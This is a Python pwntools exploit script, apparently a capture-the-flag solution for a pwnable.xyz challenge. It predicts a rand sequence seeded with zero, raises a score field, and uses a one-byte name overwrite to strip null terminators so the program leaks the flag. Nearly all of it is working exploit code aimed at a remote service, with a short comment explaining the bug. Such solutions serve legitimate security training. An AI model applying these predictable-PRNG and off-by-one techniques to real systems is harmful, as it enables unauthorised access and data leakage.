from pwn import *
from ctypes import *
'''
We are asked to choose a character, from 1 to 4. 
Enter 1byte random, 2byte random, 3byte random, and 4byte random values as srand arguments, 
respectively. So to know the sequence of random numbers that will be produced
 we want as argument 0. If we enter a number other than 1,2,3,4, the srand value is set to 0. 


So we know the random values, and if the value we input 
was bigger than the random value, we could increase the score by 1,
 and if it was the same as the random value, we could reset the name. 
The vulnerability also occurs with the name and score attached.
 If the score is 1, the name can be modified by 1 byte by strlen. 
Our purpose is to fill all the values of the score variable, 
because in the end name is printed with %s. So if there's no null name score and flag will all be printed. 





'''
lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')


score = 0
def add_score():
    sh.recvuntil('score: ')

    score = int(sh.recvline().strip())

    print "score = ", score
    rand = lib.rand()

    sh.sendlineafter('> ', str(0xffffffff))
    return score + 1


def draw(length):
    sh.recvuntil('score: ')

    score = int(sh.recvline().strip())

    print "score = ", score

    rand = lib.rand()

    sh.sendlineafter('> ', str(rand))
    sh.sendafter('Save? [N/y]', 'y')
    name = "\xff"*length
    sh.sendafter(':', name)

def lose():
    sh.recvuntil('score: ')
    score = int(sh.recvline().strip())
    print "score = ", score
    rand = lib.rand()
    sh.sendlineafter('> ', str(0))



    




debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz', 30024)
else:
    sh = process('./challenge')
sh.sendlineafter(': ', 'y')
name = "A"*0x2c
sh.sendafter(': ', name)
sh.sendafter('> ', '0')
lib.srand(0)






add_score() # 00 00 00 00 00 00 00 01
draw(45) # # 00 00 00 00 00 00 00 FF

for i in range(0, 127):

    s = 0
    add_score() 
    temp = add_score() #  00 00 00 00 00 00 01 01 on first loop
    # find how many ff's we'll gonna input 
    # e.g. 00 00 00 00 00 00 01 01 >> 8 = 00 00 00 00 00 00 00 01 >> 8 = 00 00 00 00 00 00 00 00 % 2 = 0
    while (temp % 2 != 0):
        temp = temp >> 8
        s += 1
    draw(44+s) #   00 00 00 00 00 00 FF FF first loop
# until we get 
#  01 01 01 01 01 01 01 01 --> FF FF FF FF FF FF FF FF
lose()
sh.interactive()
